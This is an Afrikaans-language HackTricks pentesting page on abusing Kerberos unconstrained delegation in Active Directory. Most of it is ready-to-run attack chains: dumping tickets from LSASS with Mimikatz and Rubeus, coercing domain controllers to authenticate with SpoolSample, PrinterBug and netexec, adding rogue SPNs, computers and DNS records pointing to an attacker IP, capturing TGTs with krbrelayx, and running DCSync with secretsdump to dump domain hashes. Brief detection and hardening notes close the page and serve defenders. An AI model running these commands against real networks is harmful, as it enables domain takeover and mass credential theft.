# Onbeperkte delegering

{{#include ../../banners/hacktricks-training.md}}

## Onbeperkte delegering

Dit is ’n kenmerk wat ’n Domain Administrator aan enige **Computer** binne die domein kan toeken. Dan sal ’n **kopie van die TGT** van ’n **user** elke keer wanneer die user by die Computer **aanmeld**, **binne die TGS gestuur word** wat deur die DC verskaf word, en **in die geheue in LSASS gestoor word**. As jy dus Administrator-regte op die masjien het, sal jy die tickets kan **dump en die users kan naboots** op enige masjien.

As ’n domain admin dus by ’n Computer aanmeld waarop die kenmerk "Unconstrained Delegation" geaktiveer is, en jy plaaslike admin-regte op daardie masjien het, sal jy die ticket kan dump en die Domain Admin enige plek kan naboots (domain privesc).

Jy kan **Computer-objekte met hierdie kenmerk vind** deur na te gaan of die [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>)-kenmerk [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) bevat. Jy kan dit met ’n LDAP-filter van ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ doen; dit is wat powerview doen:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Laai die ticket van Administrator (of die slagoffergebruiker) in die geheue met **Mimikatz** of **Rubeus vir ’n** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Meer inligting: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Meer inligting oor Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

As ’n aanvaller ’n rekenaar wat vir "Unconstrained Delegation" toegelaat word, kan **kompromitteer**, kan hy ’n **Print server** **mislei** om outomaties daarteen aan te meld en ’n **TGT** in die bediener se geheue te stoor.\
Die aanvaller kan dan ’n **Pass the Ticket attack uitvoer om die gebruiker** van die Print server-rekenaarrekening na te boots.

Om ’n print server teen enige masjien te laat aanmeld, kan jy [**SpoolSample**](https://github.com/leechristensen/SpoolSample) gebruik:

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

As die TGT van ’n domain controller afkomstig is, kan jy ’n [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) uitvoer en al die hashes van die DC verkry.\
[**Meer inligting oor hierdie aanval by ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Vind hier ander maniere om **’n authentication af te dwing:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Enige ander coercion primitive wat veroorsaak dat die slagoffer met **Kerberos** by jou unconstrained-delegation-host authenticate, werk ook. In moderne omgewings beteken dit dikwels dat die klassieke PrinterBug-vloei met **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** of **WebClient/WebDAV**-gebaseerde coercion vervang word, afhangende van watter RPC-oppervlak bereikbaar is.

### Misbruik van ’n user/service account met unconstrained delegation

Unconstrained delegation is **nie beperk tot computer-objekte nie**. ’n **user/service account** kan ook as `TRUSTED_FOR_DELEGATION` gekonfigureer word. In daardie scenario is die praktiese vereiste dat die rekening Kerberos-service tickets moet ontvang vir ’n **SPN wat dit besit**.

Dit lei tot 2 baie algemene offensiewe roetes:

1. Jy kompromitteer die wagwoord/hash van die unconstrained-delegation-**user account**, en **voeg dan ’n SPN** by daardie selfde rekening.
2. Die rekening het reeds een of meer SPN’s, maar een daarvan wys na ’n **verouderde/gedekommissioneerde gasheernaam**; om die ontbrekende **DNS A-record** te herskep, is genoeg om die authentication-vloei te kaap sonder om die SPN-stel te wysig.<sup>[[8]](#references)</sup>

Minimale Linux-vloei:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Notes:

- Dit is veral nuttig wanneer die unconstrained principal ’n **diensrekening** is en jy net sy aanmeldbewyse het, nie kode-uitvoering op ’n domeingekoppelde gasheer nie.
- As die teikengebruiker reeds ’n **verouderde SPN** het, kan dit minder opvallend wees om die ooreenstemmende **DNS-rekord** te herskep as om ’n nuwe SPN in AD te skryf.
- Onlangse Linux-gesentreerde tradecraft gebruik `addspn.py`, `dnstool.py`, `krbrelayx.py` en een coercion-primitief; jy hoef nie ’n Windows-gasheer aan te raak om die ketting te voltooi nie.

### Misbruik van Unconstrained Delegation met ’n rekenaar wat deur die aanvaller geskep is

Moderne domeine het dikwels `MachineAccountQuota > 0` (standaard 10), wat enige geauthentiseerde principal toelaat om tot N rekenaarobjekte te skep. As jy ook die `SeEnableDelegationPrivilege`-tokenvoorreg (of ekwivalente regte) het, kan jy die nuutgeskepte rekenaar instel om vir unconstrained delegation vertrou te word en inkomende TGT’s van bevoorregte stelsels te oes.<sup>[[1]](#references)</sup>

Vloei op hoë vlak:

1) Skep ’n rekenaar wat jy beheer

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Maak die vals gasheernaam binne die domein oplosbaar

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Aktiveer Unconstrained Delegation op die aanvaller-beheerde rekenaar

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Waarom dit werk: met unconstrained delegation kas die LSA op ’n rekenaar met delegation enabled inkomende TGT’s. As jy ’n DC of bevoorregte bediener mislei om by jou vals host te autentiseer, word sy masjien-TGT gestoor en kan dit uitgevoer word.

4) Begin krbrelayx in export mode en berei die Kerberos-materiaal voor

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Dwing die DC/bedieners om by jou vals gasheer te verifieer

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx sal ccache-lêers stoor wanneer ’n masjien verifieer, byvoorbeeld:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Gebruik die vasgevangde DC-masjien-TGT om DCSync uit te voer

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Notas en vereistes:

- `MachineAccountQuota > 0` maak dit moontlik om rekenaars sonder spesiale regte te skep; anders het jy uitdruklike regte nodig.
- Om `TRUSTED_FOR_DELEGATION` op ’n rekenaar te stel, vereis `SeEnableDelegationPrivilege` (of domeinadministrateurregte).
- Maak seker dat naamresolusie na jou vals gasheer wys (DNS A-rekord), sodat die DC dit via FQDN kan bereik.
- Forsering vereis ’n geskikte metode (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, ens.). Deaktiveer hierdie metodes op DC’s indien moontlik.
- As die slagofferrekening gemerk is as **"Account is sensitive and cannot be delegated"** of ’n lid van **Protected Users** is, sal die aangestuurde TGT nie by die diensticket ingesluit word nie; dus sal hierdie ketting nie ’n herbruikbare TGT oplewer nie.<sup>[[9]](#references)</sup>
- As **Credential Guard** op die verifiërende kliënt/bediener geaktiveer is, blokkeer Windows **Kerberos unconstrained delegation**, wat kan veroorsaak dat andersins geldige forseringsmetodes vanuit die operateur se perspektief misluk.

Opsporings- en verhardingsidees:

- Stel waarskuwings op vir Event ID 4741 (rekenaarrekening geskep) en 4742/4738 (rekenaar-/gebruikerrekening verander) wanneer UAC `TRUSTED_FOR_DELEGATION` gestel word.
- Monitor vir ongewone DNS A-rekordtoevoegings in die domeinsone.
- Hou dop vir toenames in 4768/4769 vanaf onverwagte gashere en DC-verifikasies na gashere wat nie DC’s is nie.
- Beperk `SeEnableDelegationPrivilege` tot ’n minimale stel, stel `MachineAccountQuota=0` waar haalbaar, en deaktiveer Print Spooler op DC’s. Dwing LDAP signing en channel binding af.

### Versagting

- Beperk DA/Admin-aanmeldings tot spesifieke dienste.
- Stel "Account is sensitive and cannot be delegated" vir bevoorregte rekeninge.

## References

- [1] [HTB: Delegate — SYSVOL-bewyse → Targeted Kerberoast → Unconstrained Delegation → DCSync na DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domein-kompromittering via onbeperkte delegasie](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME-vurk)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Sekuriteitsgroep Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domein-kompromittering via DC-printbediener en Kerberos-delegasie](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
